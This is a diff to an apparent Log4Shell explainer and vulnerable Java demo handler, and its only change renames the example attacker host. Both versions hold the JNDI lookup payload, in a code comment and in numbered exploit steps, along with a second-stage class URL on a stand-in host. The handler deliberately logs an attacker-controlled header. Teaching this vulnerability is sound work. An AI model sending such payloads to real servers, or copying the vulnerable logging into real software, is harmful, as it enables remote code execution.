@@ -177,7 +177,7 @@ public class VulnerableLog4jExampleHandler implements HttpHandler {
     String apiVersion = he.getRequestHeader("X-Api-Version");
 
     // This line triggers the RCE by logging the attacker-controlled HTTP header.
-    // The attacker can set their X-Api-Version header to: ${jndi:ldap://attacker.com/a}
+    // The attacker can set their X-Api-Version header to: ${jndi:ldap://some-attacker.com/a}
     log.info("Requested Api Version:{}", apiVersion);
 
     String response = "<h1>Hello from: " + apiVersion + "!</h1>";
@@ -214,9 +214,9 @@ the logs should include an error message indicating that a remote lookup was att
 ### Exploit Steps
 
 1. Data from the User gets sent to the server (via any protocol),
-2. The server logs the data in the request, containing the malicious payload: `${jndi:ldap://attacker.com/a}` (where `attacker.com` is an attacker controlled server),
-3. The `log4j` vulnerability is triggered by this payload and the server makes a request to `attacker.com` via "[Java Naming and Directory Interface](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)" (JNDI),
-4. This response contains a path to a remote Java class file (ex. `http://second-stage.attacker.com/Exploit.class`) which is injected into the server process,
+2. The server logs the data in the request, containing the malicious payload: `${jndi:ldap://some-attacker.com/a}` (where `some-attacker.com` is an attacker controlled server),
+3. The `log4j` vulnerability is triggered by this payload and the server makes a request to `some-attacker.com` via "[Java Naming and Directory Interface](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)" (JNDI),
+4. This response contains a path to a remote Java class file (ex. `http://second-stage.some-attacker.com/Exploit.class`) which is injected into the server process,
 5. This injected payload triggers a second stage, and allows an attacker to execute arbitrary code.
 
 Due to how common Java vulnerabilities such as these are, security researchers have created tools to easily exploit
